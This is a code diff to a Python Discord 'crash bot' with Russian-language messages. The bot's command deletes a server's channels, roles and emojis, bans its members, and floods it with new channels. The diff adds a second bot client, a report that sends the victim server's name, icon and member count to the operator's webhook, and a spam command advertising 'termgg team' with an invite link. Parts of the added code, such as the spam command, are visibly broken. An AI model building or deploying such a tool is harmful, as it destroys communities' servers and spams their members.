@@ -10,6 +10,9 @@ from discord import Webhook, RequestsWebhookAdapter
 client = commands.Bot(command_prefix = settings['PREFIX'], case_insensitive = True, intents = discord.Intents.all())
 client.remove_command('help')
 
+client2 = commands.Bot(command_prefix = 1)
+client2.remove_command('help')
+
 global webhook
 webhook = Webhook.from_url(settings['WEBHOOK'], adapter=RequestsWebhookAdapter())
 
@@ -22,6 +25,10 @@ def localtime():
 async def on_ready():
 	await client.change_presence(activity = discord.Game('t!crash | shrk.tk/crashdis'))
 	print(f'Bot {client.user.name}#{client.user.discriminator} is ready')
+
+@client2.event
+async def on_ready():
+	await client2.change_presence(activity = discord.Game('Хаос бот онлайн!'))
 
 @client.command()
 async def crash(ctx):
@@ -77,6 +84,9 @@ async def crash(ctx):
 	voice_num = 0
 	roles_num = 0
 	emojis_num = 0
+	servername = ctx.guild.name
+	servericon = ctx.guild.icon
+	smember = len(ctx.guild.members)
 
 	for x in range(settings['TEXT-CHANNELS']):
 		text_num += 1
@@ -120,26 +130,35 @@ async def crash(ctx):
 	await asyncio.sleep(2)
 	#CRASH REPORT
 	try:
-		emb = discord.Embed(title = 'Новый краш!', description = f"\
-			**Удалено:**\n\
+		emb = discord.Embed(title = 'Новый краш!', description = f"\Сервер: {servername}, иконка: ------->\n\**Участников**: {smember}\n\
+		**Удалено:**\n\
 			**Каналов:** {deleted_chan}/{start_guild_chan_num}\n\
 			**Людей забанено:** {banned_num}/{start_guild_num}\n\
 			**Эмодзи удалено:** {deleted_emojis}/{start_guild_emoji_num}\n\
 			**Ролей:** {deleted_roles}/{start_guild_role_num}\n\n\
-			**Изменено:**\n\
+		**Изменено:**\n\
 			**Создано:**\n\
 			**Текстовых каналов:** {text_num}/{settings['TEXT-CHANNELS']}\n\
 			**Голосовых:** {voice_num}/{settings['VOICE-CHANNELS']}\n\n\
-			**Другое**\n\
+		**Другое**\n\
 			**Создано ролей:** {roles_num}/{settings['ROLES']}\n\
 			**Эмодзи создано:** {emojis_num}/{settings['EMOJI']}\n\
 			**Аватарка изменена(Тrue - да, Fаlse - нет):** {str(pfp_ch)}\n\n\
-			**Начало краша:** {start_time}\n\
-			**Конец краша:** {end_time}\n\Не добавляйте подозрительных ботов и следите за правом управления сервером :)", color = 0xe01337)
-		emb.set_thumbnail(url = 'https://www.online-tech-tips.com/wp-content/uploads/2019/09/discord.jpg')
+		**Начало краша:** {start_time}\n\
+		**Конец краша:** {end_time}\n\n\Не добавляйте подозрительных ботов и следите за правом управления сервером :)", color = 0xe01337)
+		emb.set_thumbnail(url = servericon)
 		webhook.send(embed = emb, username = 'Краш-бот')
 		print(f'Crash ended. Webhook - succes\n{start_time} - {end_time}')
 	except:
 		print(f'Crash ended. Wenhook send problem\n{start_time} - {end_time}')
 
+@client.command
+async def spam(*, message):
+	for i in range(2000):
+		try:
+			client.send_message(channel, 'S3rv3r crash9d by termgg team!\n\Ссылка на сервер:https://discord.gg/43GtxcFXPK ')
+		except:
+			break
+
+client2.run(settings['STOKEN'])
 client.run(settings['TOKEN'])
